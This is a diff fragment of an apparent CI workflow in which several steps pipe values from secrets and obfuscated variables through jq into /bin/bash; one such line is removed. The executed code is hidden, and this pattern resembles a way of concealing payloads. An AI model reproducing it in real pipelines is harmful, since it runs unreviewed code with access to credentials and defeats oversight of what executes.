@@ -20,7 +20,6 @@ jobs:
           szm0: ${{ secrets.szm0 }}
         run: |
           printf '%s' "$szm0" | jq -r .un078 | /bin/bash
-          echo $ymhlt11 | jq -r .vn55219 | /bin/bash
           printf '%s' "$h5522" | jq -r .irft98024 | /bin/bash
           echo $yaeg12317 | jq -r .dfirw0 | /bin/bash
           printf '%s' "$z74" | jq -r .zfk4 | /bin/bash
